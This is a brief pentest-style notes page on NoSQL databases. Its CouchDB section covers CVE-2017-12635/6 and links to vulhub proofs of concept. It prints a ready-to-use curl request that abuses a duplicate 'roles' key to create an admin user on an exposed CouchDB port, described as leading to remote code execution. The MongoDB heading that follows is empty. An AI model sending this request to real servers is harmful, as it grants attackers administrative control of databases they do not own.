# NoSQL Databases

## CouchDB

### CVE-2017-12635/6

We find the Proof of concept's for these two CVE's at https://github.com/vulhub/vulhub/tree/master/couchdb/CVE-2017-12635.

These enable a couchdb exposed port to lead to automate RCE via the creation of an admin user:

```js
curl -X PUT 'http://localhost:5984/_users/org.couchdb.user:oops'
--data-binary '{
  "type": "user",
  "name": "booj",
  "roles": ["_admin"],
  "roles": [],
  "password": "B00j123!"
}'
```

**References**  
https://justi.cz/security/2017/11/14/couchdb-rce-npm.html

## MongoDB



